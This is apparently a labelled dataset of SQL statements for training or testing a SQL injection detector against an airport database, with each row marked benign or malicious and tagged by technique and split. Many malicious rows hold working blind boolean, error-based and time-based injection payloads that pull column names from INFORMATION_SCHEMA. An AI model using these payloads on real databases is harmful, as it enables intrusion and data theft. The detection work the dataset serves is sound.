"SELECT a.name AS airport_name,a.municipality,COUNT(r.id) AS runway_count, CAST(AVG(r.length_ft) AS SIGNED) AS avg_runway_length FROM airport a JOIN runways r ON a.id = r.airport_ref WHERE r.length_ft >=  CAST(""5766"" AS SIGNED) AND a.iso_country = ""TV"" GROUP BY a.id, a.name, a.municipality ORDER BY avg_runway_length DESC;",0,5766 TV,,,,select,airport-S22,,,test
"SELECT a.name AS airport_name,a.municipality,COUNT(r.id) AS runway_count, CAST(AVG(r.length_ft) AS SIGNED) AS avg_runway_length FROM airport a JOIN runways r ON a.id = r.airport_ref WHERE r.length_ft >=  CAST(""5773"" AS SIGNED) AND a.iso_country = ""KR"" GROUP BY a.id, a.name, a.municipality ORDER BY avg_runway_length DESC;",0,5773 KR,,,,select,airport-S22,,,test
"SELECT * FROM airport WHERE gps_code = ""KEFD"" OR local_code = ""97MI""",0,KEFD 97MI,,,,select,airport-S4,,,train
"UPDATE airport_frequencies SET description = ""TWR"" WHERE airport_ident = ""KJWN"";",0,TWR KJWN,,,,update,airport-U5,,,test
"INSERT INTO navaids (id, ident, name, type, frequency_khz, iso_country) VALUES (91518, ""RBU"", ""Carlz"", ""VOR-DME"", 266, ""US"")",1," 91518 RBU"" Carlz"" VOR-DME 266 US ",recon,space2comment,failure,insert,airport-I10,stacked-57,stacked,test
"SELECT af.type, af.description, af.frequency_mhz FROM airport_frequencies af WHERE af.airport_ident = ""US-11646"";",0,US-11646,,,,select,airport-S7,,,test
"UPDATE countries SET keywords = ""Airports in Luxembourg"" WHERE code = ""VC"";",0,Airports in Luxembourg VC,,,,update,airport-U8,,,test
"SELECT a.ident, a.name, r.name AS region_name FROM airport a JOIN regions r ON a.iso_region = r.code WHERE r.name = ""Harju County"";",0,Harju County,,,,select,airport-S15,,,test
"UPDATE airport SET name = ""Bella Coola Water Aerodrome"" WHERE ident = ""US-5826""",0,Bella Coola Water Aerodrome US-5826,,,,update,airport-U1,,,train
"SELECT id, name, icao_code FROM airport WHERE elevation_ft BETWEEN 130.0 AND 106.0",0,130.0 106.0,,,,select,airport-S2,,,test
"SELECT a.id, a.ident, a.name, a.latitude_deg, a.longitude_deg,(6371 * ACOS(COS(RADIANS(a.latitude_deg)) * COS(RADIANS(b.latitude_deg)) * COS(RADIANS(b.longitude_deg) - RADIANS(a.longitude_deg)) + SIN(RADIANS(a.latitude_deg)) * SIN(RADIANS(b.latitude_deg)))) AS distance FROM airport a JOIN airport b ON b.name = ""Chemnitz-Glösa Industrial Park Heliport"" WHERE a.id != b.id  ORDER BY distance LIMIT 50;",0,Chemnitz-Glösa Industrial Park Heliport,,,,select,airport-S14,,,train
"SELECT a.name, a.municipality, a.iso_country FROM airport a WHERE a.type IN ('large_airport', 'medium_airport') AND a.iso_country = ""SK""",0,SK,,,,select,airport-S9,,,test
"SELECT a.id, a.name, a.municipality, a.iso_country FROM airport a WHERE a.id IN (SELECT id FROM airport WHERE keywords LIKE ""6LA9"") OR name LIKE ""JP2""",0,6LA9 JP2,,,,select,airport-S10,,,test
"INSERT INTO airport (ident, type, name, latitude_deg, longitude_deg, elevation_ft) VALUES (""34ND"", ""closed"", ""Gould Airfield (RAAF)"", 43.55819, 143.45136, 1276.0));(select * from (select(SLEEP(5)))jjlS)#)",1, 34ND closed Gould Airfield (RAAF  43.55819 143.45136 1276.0  ;(select * from (select(SLEEP(5   jjlS # ,recon,lowercase,failure,insert,airport-I2,stacked-9,stacked,test
"UPDATE airport_frequencies SET type = 'TWR' WHERE airport_ident IN ('57MA','57MA','57MA','57MA');",1, 57MA 57MA 57MA 57MA ,recon,lowercase,success,update,airport-U10,stacked-111,stacked,test
"SELECT 'Airport Frequency' as source_type, af.airport_ident as code, a.name as location_name, af.type as frequency_type, af.frequency_mhz as frequency, af.description, a.municipality, a.iso_country FROM airport_frequencies af JOIN airport a ON af.airport_ident = a.ident WHERE af.frequency_mhz BETWEEN 122.95 AND  122.8  UNION ALL SELECT 'Navaid Frequency' as source_type,    n.ident as code, n.name as location_name, n.type as frequency_type,n.frequency_khz / 1000.0 as frequency,  n.usageType as description, 'N/A' as municipality, n.iso_country FROM navaids n WHERE n.frequency_khz IS NOT NULL AND (n.frequency_khz / 1000.0) BETWEEN  126.2  AND  122.225  ORDER BY frequency;",0,122.95 122.8 126.2 122.225,,,,select,airport-S13,,,test
"SELECT 'Airport Frequency' as source_type, af.airport_ident as code, a.name as location_name, af.type as frequency_type, af.frequency_mhz as frequency, af.description, a.municipality, a.iso_country FROM airport_frequencies af JOIN airport a ON af.airport_ident = a.ident WHERE af.frequency_mhz BETWEEN 118.1 AND  118.15  UNION ALL SELECT 'Navaid Frequency' as source_type,    n.ident as code, n.name as location_name, n.type as frequency_type,n.frequency_khz / 1000.0 as frequency,  n.usageType as description, 'N/A' as municipality, n.iso_country FROM navaids n WHERE n.frequency_khz IS NOT NULL AND (n.frequency_khz / 1000.0) BETWEEN  120.5  AND  126.7  ORDER BY frequency;",0,118.1 118.15 120.5 126.7,,,,select,airport-S13,,,test
"SELECT a.id, a.name, a.type, a.iso_country, a.municipality FROM airport a WHERE a.elevation_ft > (SELECT AVG(elevation_ft) FROM airport WHERE iso_country = ""TH"") OR a.elevation_ft > 39.0",0,TH 39.0,,,,select,airport-S11,,,test
"UPDATE regions SET keywords = ""Airports in Wotho"" WHERE iso_country = ""UAOR�EXP(~(SELECT	*FROM(SELECT
CONCAT(0x716a706a71,(SELECT(ELT(6120=6120,1))),0x71767a6b71,0x78))x))#oYfa"";",1," Airports in Wotho UAOR�EXP(~(SELECT	*FROM(SELECT
CONCAT(0x716a706a71,(SELECT(ELT(6120=6120,1))),0x71767a6b71,0x78))x))#oYfa ",recon,space2mysqlblank,success,update,airport-U9,error-103,error,test
"SELECT name, 'airport' AS entity_type FROM airport WHERE keywords LIKE CONCAT(""%"", ""SNNY"", ""%"") UNION SELECT name, 'region' AS entity_type FROM regions WHERE keywords LIKE CONCAT(""%"", ""Airports in Korçë County"", ""%"")  UNION SELECT name, 'country' AS entity_type FROM countries WHERE keywords LIKE CONCAT(""%"", ""Aeropuertos de Uruguay"", ""%"");",0,SNNY Airports in Korçë County Aeropuertos de Uruguay,,,,select,airport-S18,,,test
"SELECT a.name, a.municipality, a.iso_country FROM airport a WHERE a.type IN ('large_airport', 'medium_airport') AND a.iso_country = ""US""",0,US,,,,select,airport-S9,,,test
"SELECT r.name AS region_name, COUNT(a.id) AS airport_count FROM airport a JOIN regions r ON a.iso_region = r.code WHERE a.iso_country = ""SD"" GROUP BY r.name ORDER BY r.name ASC;",0,SD,,,,select,airport-S16,,,train
"SELECT 'Airport Frequency' as source_type, af.airport_ident as code, a.name as location_name, af.type as frequency_type, af.frequency_mhz as frequency, af.description, a.municipality, a.iso_country FROM airport_frequencies af JOIN airport a ON af.airport_ident = a.ident WHERE af.frequency_mhz BETWEEN 120.65 AND  121.6  UNION ALL SELECT 'Navaid Frequency' as source_type,    n.ident as code, n.name as location_name, n.type as frequency_type,n.frequency_khz / 1000.0 as frequency,  n.usageType as description, 'N/A' as municipality, n.iso_country FROM navaids n WHERE n.frequency_khz IS NOT NULL AND (n.frequency_khz / 1000.0) BETWEEN  119.1  AND  122.8  ORDER BY frequency;",0,120.65 121.6 119.1 122.8,,,,select,airport-S13,,,test
"SELECT name, IFNULL(iata_code, 'NO_IATA') AS iata_display, IFNULL(icao_code, 'NO_ICAO') AS icao_display,  MID(name, 1, 5) AS short_name, municipality FROM airport WHERE municipality LIKE ""Panamá City;""",0,Panamá City,,,,select,airport-S21,,,test
"SELECT r.name AS region_name, COUNT(a.id) AS airport_count FROM airport a JOIN regions r ON a.iso_region = r.code WHERE a.iso_country = ""PR"" GROUP BY r.name ORDER BY r.name ASC;",0,PR,,,,select,airport-S5,,,test
"INSERT INTO countries (code, name, continent, keywords) VALUES (""SD"" LIKE ""SD"" AND ELT(ORD(MID((SELECT IFNULL(CAST(column_name AS NCHAR),0x20) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name LIKE 0x616972706f7274 AND table_schema LIKE 0x64617461736574 LIMIT 7,1),1,1))>112,9995) AND ""SD"" LIKE ""SD"", ""Tanzania"", ""EU"", ""Airports in Sint Maarten"")",1," SD"" LIKE ""SD"" AND ELT(ORD(MID((SELECT IFNULL(CAST(column_name AS NCHAR),0x20) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name LIKE 0x616972706f7274 AND table_schema LIKE 0x64617461736574 LIMIT 7,1),1,1))>112,9995) AND ""SD"" LIKE ""SD Tanzania EU Airports in Sint Maarten ",exploit,equaltolike,success,insert,airport-I6,boolean-30,boolean,test
"SELECT n.type, c.name as country_name, COUNT(n.id) as navaid_count  FROM navaids n JOIN countries c ON n.iso_country = c.code WHERE c.code = ""MW"" OR c.name LIKE CONCAT(""%"", ""French Polynesia"", ""%"") GROUP BY n.type, c.name HAVING COUNT(n.id) > 3 ORDER BY navaid_count DESC;",0,MW French Polynesia 3,,,,select,airport-S20,,,test
"UPDATE airport_frequencies SET type = 'TWR' WHERE airport_ident IN ('MO7') AND 1342 LIKE (SELECT (CASE WHEN (ORD(MID((SELECT IFNULL(CAST(column_name AS NCHAR),0x20) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name LIKE 0x616972706f7274 AND table_schema LIKE 0x64617461736574 LIMIT 16,1),7,1))>96) THEN 1342 ELSE (SELECT 4245 UNION SELECT 4252) END))-- -','MO7') AND 1342 LIKE (SELECT (CASE WHEN (ORD(MID((SELECT IFNULL(CAST(column_name AS NCHAR),0x20) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name LIKE 0x616972706f7274 AND table_schema LIKE 0x64617461736574 LIMIT 16,1),7,1))>96) THEN 1342 ELSE (SELECT 4245 UNION SELECT 4252) END))-- -','MO7') AND 1342 LIKE (SELECT (CASE WHEN (ORD(MID((SELECT IFNULL(CAST(column_name AS NCHAR),0x20) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name LIKE 0x616972706f7274 AND table_schema LIKE 0x64617461736574 LIMIT 16,1),7,1))>96) THEN 1342 ELSE (SELECT 4245 UNION SELECT 4252) END))-- -','MO7') AND 1342 LIKE (SELECT (CASE WHEN (ORD(MID((SELECT IFNULL(CAST(column_name AS NCHAR),0x20) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name LIKE 0x616972706f7274 AND table_schema LIKE 0x64617461736574 LIMIT 16,1),7,1))>96) THEN 1342 ELSE (SELECT 4245 UNION SELECT 4252) END))-- -');",1," MO7') AND 1342 LIKE (SELECT (CASE WHEN (ORD(MID((SELECT IFNULL(CAST(column_name AS NCHAR),0x20) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name LIKE 0x616972706f7274 AND table_schema LIKE 0x64617461736574 LIMIT 16,1),7,1))>96) THEN 1342 ELSE (SELECT 4245 UNION SELECT 4252) END))-- - MO7') AND 1342 LIKE (SELECT (CASE WHEN (ORD(MID((SELECT IFNULL(CAST(column_name AS NCHAR),0x20) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name LIKE 0x616972706f7274 AND table_schema LIKE 0x64617461736574 LIMIT 16,1),7,1))>96) THEN 1342 ELSE (SELECT 4245 UNION SELECT 4252) END))-- - MO7') AND 1342 LIKE (SELECT (CASE WHEN (ORD(MID((SELECT IFNULL(CAST(column_name AS NCHAR),0x20) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name LIKE 0x616972706f7274 AND table_schema LIKE 0x64617461736574 LIMIT 16,1),7,1))>96) THEN 1342 ELSE (SELECT 4245 UNION SELECT 4252) END))-- - MO7') AND 1342 LIKE (SELECT (CASE WHEN (ORD(MID((SELECT IFNULL(CAST(column_name AS NCHAR),0x20) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name LIKE 0x616972706f7274 AND table_schema LIKE 0x64617461736574 LIMIT 16,1),7,1))>96) THEN 1342 ELSE (SELECT 4245 UNION SELECT 4252) END))-- - ",exploit,equaltolike,success,update,airport-U10,boolean-108,boolean,test
"SELECT name, 'airport' AS entity_type FROM airport WHERE keywords LIKE CONCAT(""%"", ""SSDM"", ""%"") UNION SELECT name, 'region' AS entity_type FROM regions WHERE keywords LIKE CONCAT(""%"", ""Airports in Ziri"", ""%"")  UNION SELECT name, 'country' AS entity_type FROM countries WHERE keywords LIKE CONCAT(""%"", ""Airports in Cook Islands"", ""%"");",0,SSDM Airports in Ziri Airports in Cook Islands,,,,select,airport-S18,,,test
"SELECT name, IFNULL(iata_code, 'NO_IATA') AS iata_display, IFNULL(icao_code, 'NO_ICAO') AS icao_display,  MID(name, 1, 5) AS short_name, municipality FROM airport WHERE municipality LIKE ""Goiânia"" and 7019=(select (case when (ord(mid((select ifnull(cast(column_name as nchar),0x20) from INFORMATION_SCHEMA.columns where table_name=0x72756e77617973 and table_schema=0x64617461736574 limit 6,1),2,1))>96) then 7019 else (select 5769 union select 6383) end))-- -;""",1," Goiânia"" and 7019=(select (case when (ord(mid((select ifnull(cast(column_name as nchar),0x20) from INFORMATION_SCHEMA.columns where table_name=0x72756e77617973 and table_schema=0x64617461736574 limit 6,1),2,1))>96) then 7019 else (select 5769 union select 6383) end))-- - ",exploit,lowercase,success,select,airport-S21,boolean-258,boolean,test
"SELECT * FROM airport WHERE continent = ""AS"" AND iso_region LIKE ""BR-MS""",0,AS BR-MS,,,,select,airport-S8,,,test
"SELECT id, name, icao_code FROM airport WHERE elevation_ft BETWEEN 34.0 AND 2561.0",0,34.0 2561.0,,,,select,airport-S2,,,test
"INSERT INTO regions (code, name, continent, iso_country, wikipedia_link, keywords) VALUES (""RU-NEN"", ""Maluku"", ""AS"", ""CN"", ""https://en.wikipedia.org/wiki/Melaka"", ""Airports in Sangha Department"")",0,RU-NEN Maluku AS CN https://en.wikipedia.org/wiki/Melaka Airports in Sangha Department,,,,insert,airport-I4,,,test
"UPDATE regions SET keywords = ""Airports in Zambezia Province"" where 8853=8853 and 1024=(select (case when (ord(mid((select ifnull(cast(column_name as nchar),0x20) from INFORMATION_SCHEMA.columns where table_name=0x72756e77617973 and table_schema=0x64617461736574 limit 18,1),1,1))>112) then 1024 else (select 5444 union select 9670) end))-- -"" WHERE iso_country = ""LV"";",1," Airports in Zambezia Province"" where 8853=8853 and 1024=(select (case when (ord(mid((select ifnull(cast(column_name as nchar),0x20) from INFORMATION_SCHEMA.columns where table_name=0x72756e77617973 and table_schema=0x64617461736574 limit 18,1),1,1))>112) then 1024 else (select 5444 union select 9670) end))-- - LV ",exploit,lowercase,success,update,airport-U9,boolean-102,boolean,test
SHOW SESSION STATUS ,0,,,,,admin,airport-admin4,,,test
"SELECT a.name AS airport_name,a.municipality,COUNT(r.id) AS runway_count, CAST(AVG(r.length_ft) AS SIGNED) AS avg_runway_length FROM airport a JOIN runways r ON a.id = r.airport_ref WHERE r.length_ft >=  CAST(""4149"" AS SIGNED) AND a.iso_country = ""MU"" AND MAKE_SET(4491 LIKE 4491,8619)-- OQpi"" GROUP BY a.id, a.name, a.municipality ORDER BY avg_runway_length DESC;",1," 4149 MU"" AND MAKE_SET(4491 LIKE 4491,8619)-- OQpi ",recon,equaltolike,success,select,airport-S22,boolean-264,boolean,test
"SELECT * FROM airport WHERE gps_code = ""SNFU"" OR local_code = ""9V6""",0,SNFU 9V6,,,,select,airport-S4,,,test
"SELECT name, 'airport' AS type FROM airport WHERE keywords LIKE CONCAT(""%"",  ""QMM"", ""%"") UNION SELECT name, 'region' FROM regions WHERE keywords LIKE CONCAT(""%"", ""Forward Operating Base Carlson"", ""%"") UNION SELECT name, 'country' FROM countries WHERE keywords LIKE CONCAT(""%"", ""Büllingen ULM"", ""%"");",0,QMM Forward Operating Base Carlson Büllingen ULM,,,,select,airport-S17,,,test
"SELECT id, name, icao_code FROM airport WHERE elevation_ft BETWEEN 393.0 AND 633.0",0,393.0 633.0,,,,select,airport-S2,,,test
"SELECT name, IFNULL(iata_code, 'NO_IATA') AS iata_display, IFNULL(icao_code, 'NO_ICAO') AS icao_display,  MID(name, 1, 5) AS short_name, municipality FROM airport WHERE municipality LIKE ""Khvoshab;""",0,Khvoshab,,,,select,airport-S21,,,test
"INSERT INTO airport (ident, type, name, wikipedia_link, continent) VALUES (""US-10006"",""closed"", ""Dodge City Army Air Field"",""https://en.wikipedia.org/wiki/Tari_Airport"",""AS"")",0,US-10006 closed Dodge City Army Air Field https://en.wikipedia.org/wiki/Tari_Airport AS,,,,insert,airport-I3,,,test
"SELECT a.name AS airport_name,a.municipality,COUNT(r.id) AS runway_count, CAST(AVG(r.length_ft) AS SIGNED) AS avg_runway_length FROM airport a JOIN runways r ON a.id = r.airport_ref WHERE r.length_ft >=  CAST(""1960"" AS SIGNED) AND a.iso_country = ""WS"" GROUP BY a.id, a.name, a.municipality ORDER BY avg_runway_length DESC;",0,1960 WS,,,,select,airport-S22,,,test
"INSERT INTO countries (code, name, continent, keywords) VALUES (""SD"" LIKE ""SD"" AND ELT(ORD(MID((SELECT IFNULL(CAST(column_name AS NCHAR),0x20) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name LIKE 0x6e617661696473 AND table_schema LIKE 0x64617461736574 LIMIT 16,1),23,1))>96,6492) AND ""SD"" LIKE ""SD"", ""Tanzania"", ""EU"", ""Airports in Sint Maarten"")",1," SD"" LIKE ""SD"" AND ELT(ORD(MID((SELECT IFNULL(CAST(column_name AS NCHAR),0x20) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name LIKE 0x6e617661696473 AND table_schema LIKE 0x64617461736574 LIMIT 16,1),23,1))>96,6492) AND ""SD"" LIKE ""SD Tanzania EU Airports in Sint Maarten ",exploit,equaltolike,success,insert,airport-I6,boolean-30,boolean,test
"INSERT INTO countries (code, name, continent, keywords) VALUES (""AE"", ""Croatia"", ""AF"", ""Airports in Saint Vincent and the Grenadines"")",0,AE Croatia AF Airports in Saint Vincent and the Grenadines,,,,insert,airport-I6,,,test
"SELECT a.name AS airport_name, a.ident AS airport_code, a.municipality, COUNT(r.id) AS runway_count FROM airport a JOIN runways r ON a.id = r.airport_ref WHERE a.iso_country = ""GA"" GROUP BY a.id, a.name, a.ident, a.municipality HAVING COUNT(r.id) > 3 ORDER BY runway_count DESC, a.name ASC;",0,GA 3,,,,select,airport-S19,,,test
"DELETE FROM runways WHERE airport_ident = ""94CL"";",0,94CL,,,,delete,airport-D5,,,test
"DELETE FROM runways WHERE airport_ident = ""SSFA"";",0,SSFA,,,,delete,airport-D5,,,test
"SELECT a.id, a.name, a.type, a.iso_country, a.municipality FROM airport a WHERE a.elevation_ft > (SELECT AVG(elevation_ft) FROM airport WHERE iso_country = ""BE"") OR a.elevation_ft > 2091.0",0,BE 2091.0,,,,select,airport-S11,,,test
"UPDATE airport_frequencies SET frequency_mhz = 122.95 WHERE type = ""POST"";",0,122.95 POST,,,,update,airport-U6,,,test
"DELETE FROM runways WHERE airport_ident = ""00MD"";",0,00MD,,,,delete,airport-D5,,,test
"INSERT INTO countries (code, name, continent) VALUES (""NI""=""NI"" AND ELT(ORD(MID((SELECT IFNULL(CAST(column_name AS NCHAR),0x20) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x616972706f7274 AND table_schema=0x64617461736574 LIMIT 14,1),2,1))>100,2404) AND ""NI""=""NI"", ""Niue"", ""AF"")",1," NI""=""NI"" AND ELT(ORD(MID((SELECT IFNULL(CAST(column_name AS NCHAR),0x20) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x616972706f7274 AND table_schema=0x64617461736574 LIMIT 14,1),2,1))>100,2404) AND ""NI""=""NI Niue AF ",exploit,sleep2getlock,success,insert,airport-I7,boolean-36,boolean,test
"SELECT id, name, icao_code FROM airport WHERE elevation_ft BETWEEN 356.0 AND 755.0",0,356.0 755.0,,,,select,airport-S2,,,test
"SELECT name, 'airport' AS entity_type FROM airport WHERE keywords LIKE CONCAT(""%"", ""Shady Airpark"", ""%"") UNION SELECT name, 'region' AS entity_type FROM regions WHERE keywords LIKE CONCAT(""%"", ""Airports in Daykundi Province"", ""%"")  UNION SELECT name, 'country' AS entity_type FROM countries WHERE keywords LIKE CONCAT(""%"", ""Aéroports de la Suisse,Flughäfen der Schweiz"", ""%"");",0,"Shady Airpark Airports in Daykundi Province Aéroports de la Suisse,Flughäfen der Schweiz",,,,select,airport-S18,,,test
"UPDATE airport SET name = ""Evergreen Tower Heliport"" WHERE ident = ""21VA' aND (selecT 2*(If((selecT * fRom (selecT CONCaT(0x7178786b71,(selecT (ElT(4896=4896,1))),0x717a707071,0x78))s), 8446744073709551610, 8446744073709551610))) aND 'BkfI'='BkfI""",1," Evergreen Tower Heliport 21VA' aND (selecT 2*(If((selecT * fRom (selecT CONCaT(0x7178786b71,(selecT (ElT(4896=4896,1))),0x717a707071,0x78))s), 8446744073709551610, 8446744073709551610))) aND 'BkfI'='BkfI ",recon,randomcase,success,update,airport-U1,error-61,error,test
"SELECT * FROM airport WHERE gps_code = ""SE16"" OR local_code = ""RDB""",0,SE16 RDB,,,,select,airport-S4,,,test
"SELECT name, 'airport' AS entity_type FROM airport WHERE keywords LIKE CONCAT(""%"", ""SJPH"", ""%"") UNION SELECT name, 'region' AS entity_type FROM regions WHERE keywords LIKE CONCAT(""%"", ""Airports in Sowa (town)"", ""%"")  UNION SELECT name, 'country' AS entity_type FROM countries WHERE keywords LIKE CONCAT(""%"", ""Holland, Luchthavens van Nederland, Dutch airports"", ""%"");",0,"SJPH Airports in Sowa (town) Holland, Luchthavens van Nederland, Dutch airports",,,,select,airport-S18,,,test
"DELETE FROM airport_frequencies WHERE type = ""INFO"";",0,INFO,,,,delete,airport-D4,,,test
"SELECT a.id, a.ident, a.name, a.latitude_deg, a.longitude_deg,(6371 * ACOS(COS(RADIANS(a.latitude_deg)) * COS(RADIANS(b.latitude_deg)) * COS(RADIANS(b.longitude_deg) - RADIANS(a.longitude_deg)) + SIN(RADIANS(a.latitude_deg)) * SIN(RADIANS(b.latitude_deg)))) AS distance FROM airport a JOIN airport b ON b.name = ""Sig Field"" WHERE a.id != b.id  ORDER BY distance LIMIT 50;",0,Sig Field,,,,select,airport-S14,,,train
"SELECT a.id, a.name, a.type, a.iso_country, a.municipality FROM airport a WHERE a.elevation_ft > (SELECT AVG(elevation_ft) FROM airport WHERE iso_country = ""BR"") OR a.elevation_ft > 2271.0",0,BR 2271.0,,,,select,airport-S11,,,test
"SELECT a.name, a.municipality, a.iso_country FROM airport a WHERE a.type IN ('large_airport', 'medium_airport') AND a.iso_country = ""US""",0,US,,,,select,airport-S9,,,test
"UPDATE regions SET keywords = ""Airports in Mosta"" WHERE iso_country = ""BF"";",0,Airports in Mosta BF,,,,update,airport-U9,,,test
"DELETE FROM airport WHERE ident=""BR-1999"";",0,BR-1999,,,,delete,airport-D1,,,test
"SELECT a.name AS airport_name, a.ident AS airport_code, a.municipality, COUNT(r.id) AS runway_count FROM airport a JOIN runways r ON a.id = r.airport_ref WHERE a.iso_country = ""LT"" GROUP BY a.id, a.name, a.ident, a.municipality HAVING COUNT(r.id) > 3 ORDER BY runway_count DESC, a.name ASC;",0,LT 3,,,,select,airport-S19,,,test
"SELECT id, ident, name FROM airport WHERE iso_country = ""EC""",0,EC,,,,select,airport-S6,,,train
"SELECT a.id, a.name, a.type, a.iso_country, a.municipality FROM airport a WHERE a.elevation_ft > (SELECT AVG(elevation_ft) FROM airport WHERE iso_country = ""AU"") OR a.elevation_ft > 1000.0",0,AU 1000.0,,,,select,airport-S11,,,test
"UPDATE airport_frequencies SET frequency_mhz = 124.9 WHERE type = ""UNIC"";",0,124.9 UNIC,,,,update,airport-U6,,,test
"INSERT INTO airport_frequencies (id, airport_ref, airport_ident, type, description, frequency_mhz) VALUES (59572, 3604, ""KFSI"", ""CTAF"", ""CTAF"", 119.8)",0,59572 3604 KFSI CTAF CTAF 119.8,,,,insert,airport-I8,,,test
"UPDATE airport SET home_link = ""https://digitalassets.lib.berkeley.edu/roho/ucb/text/digiorgio_family__w.pdf#page70"" WHERE name = ""Aero Agrícola Gaivota Airport""",0,https://digitalassets.lib.berkeley.edu/roho/ucb/text/digiorgio_family__w.pdf#page70 Aero Agrícola Gaivota Airport,,,,update,airport-U4,,,test
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airport_ref = (SELECT id FROM airport WHERE name = ""Hannover N Airport"");",0,Hannover N Airport,,,,select,airport-S12,,,train
"SELECT a.name AS airport_name, a.ident AS airport_code, a.municipality, COUNT(r.id) AS runway_count FROM airport a JOIN runways r ON a.id = r.airport_ref WHERE a.iso_country = ""SR"" GROUP BY a.id, a.name, a.ident, a.municipality HAVING COUNT(r.id) > 4 ORDER BY runway_count DESC, a.name ASC;",0,SR 4,,,,select,airport-S19,,,train
"SELECT * FROM airport WHERE gps_code = ""78GA"" OR local_code = ""LGD""",0,78GA LGD,,,,select,airport-S4,,,test
"SELECT r.name AS region_name, COUNT(a.id) AS airport_count FROM airport a JOIN regions r ON a.iso_region = r.code WHERE a.iso_country = ""AS"" GROUP BY r.name ORDER BY r.name ASC;",0,AS,,,,select,airport-S5,,,test
"SELECT a.id, a.name, a.type, a.iso_country, a.municipality FROM airport a WHERE a.elevation_ft > (SELECT AVG(elevation_ft) FROM airport WHERE iso_country = ""KR"") OR a.elevation_ft > 750.0",0,KR 750.0,,,,select,airport-S11,,,test
"UPDATE navaids SET name = ""Ula"" WHERE ident = ""RO"";",0,Ula RO,,,,update,airport-U7,,,train
"SELECT r.name AS region_name, COUNT(a.id) AS airport_count FROM airport a JOIN regions r ON a.iso_region = r.code WHERE a.iso_country = ""RE"" GROUP BY r.name ORDER BY r.name ASC;",0,RE,,,,select,airport-S16,,,test
"SELECT a.id, a.ident, a.name, a.latitude_deg, a.longitude_deg,(6371 * ACOS(COS(RADIANS(a.latitude_deg)) * COS(RADIANS(b.latitude_deg)) * COS(RADIANS(b.longitude_deg) - RADIANS(a.longitude_deg)) + SIN(RADIANS(a.latitude_deg)) * SIN(RADIANS(b.latitude_deg)))) AS distance FROM airport a JOIN airport b ON b.name = ""Bafoussam Airport"" WHERE a.id != b.id  ORDER BY distance LIMIT 50;",0,Bafoussam Airport,,,,select,airport-S14,,,train
"SELECT r.name AS region_name, COUNT(a.id) AS airport_count FROM airport a JOIN regions r ON a.iso_region = r.code WHERE a.iso_country = ""GF"" GROUP BY r.name ORDER BY r.name ASC;",0,GF,,,,select,airport-S5,,,test
"SELECT 'Airport Frequency' as source_type, af.airport_ident as code, a.name as location_name, af.type as frequency_type, af.frequency_mhz as frequency, af.description, a.municipality, a.iso_country FROM airport_frequencies af JOIN airport a ON af.airport_ident = a.ident WHERE af.frequency_mhz BETWEEN 119.6 AND  122.8  UNION ALL SELECT 'Navaid Frequency' as source_type,    n.ident as code, n.name as location_name, n.type as frequency_type,n.frequency_khz / 1000.0 as frequency,  n.usageType as description, 'N/A' as municipality, n.iso_country FROM navaids n WHERE n.frequency_khz IS NOT NULL AND (n.frequency_khz / 1000.0) BETWEEN  112.7  AND  119.7  ORDER BY frequency;",0,119.6 122.8 112.7 119.7,,,,select,airport-S13,,,test
"SELECT name, IFNULL(iata_code, 'NO_IATA') AS iata_display, IFNULL(icao_code, 'NO_ICAO') AS icao_display,  MID(name, 1, 5) AS short_name, municipality FROM airport WHERE municipality LIKE ""Goiânia"" and 6500=(select (case when (ord(mid((select ifnull(cast(column_name as nchar),0x20) from INFORMATION_SCHEMA.columns where table_name=0x6e617661696473 and table_schema=0x64617461736574 limit 17,1),4,1))>104) then 6500 else (select 5930 union select 5060) end))-- -;""",1," Goiânia"" and 6500=(select (case when (ord(mid((select ifnull(cast(column_name as nchar),0x20) from INFORMATION_SCHEMA.columns where table_name=0x6e617661696473 and table_schema=0x64617461736574 limit 17,1),4,1))>104) then 6500 else (select 5930 union select 5060) end))-- - ",exploit,lowercase,success,select,airport-S21,boolean-258,boolean,test
"SELECT a.name AS airport_name, a.ident AS airport_code, a.municipality, COUNT(r.id) AS runway_count FROM airport a JOIN runways r ON a.id = r.airport_ref WHERE a.iso_country = ""TR"" GROUP BY a.id, a.name, a.ident, a.municipality HAVING COUNT(r.id) > 5 ORDER BY runway_count DESC, a.name ASC;",0,TR 5,,,,select,airport-S19,,,test
"SELECT a.id, a.name, a.municipality, a.iso_country FROM airport a WHERE a.id IN (SELECT id FROM airport WHERE keywords LIKE ""KRCO, CRO"") OR name LIKE ""95LL""",0,"KRCO, CRO 95LL",,,,select,airport-S10,,,test
"SELECT a.ident, a.name, r.name AS region_name FROM airport a JOIN regions r ON a.iso_region = r.code WHERE r.name = ""Ismayilli District"";",0,Ismayilli District,,,,select,airport-S15,,,test
"SELECT r.name AS region_name, COUNT(a.id) AS airport_count FROM airport a JOIN regions r ON a.iso_region = r.code WHERE a.iso_country = ""XK"" GROUP BY r.name ORDER BY r.name ASC;",0,XK,,,,select,airport-S5,,,test
"SELECT a.ident, a.name, r.name AS region_name FROM airport a JOIN regions r ON a.iso_region = r.code WHERE r.name = ""Eschen"";",0,Eschen,,,,select,airport-S15,,,test
"SELECT a.id, a.name, a.type, a.iso_country, a.municipality FROM airport a WHERE a.elevation_ft > (SELECT AVG(elevation_ft) FROM airport WHERE iso_country = ""US"") OR a.elevation_ft > 646.0",0,US 646.0,,,,select,airport-S11,,,test
"SELECT id, ident, name FROM airport WHERE iso_country = ""US""",0,US,,,,select,airport-S6,,,test
"INSERT INTO airport (ident, type, name, latitude_deg, longitude_deg, elevation_ft) VALUES (""ID-0086"", ""heliport"", ""Langepas Heliport"", 38.230499267578125, 19.86158, 49.0)",0,ID-0086 heliport Langepas Heliport 38.230499267578125 19.86158 49.0,,,,insert,airport-I2,,,test
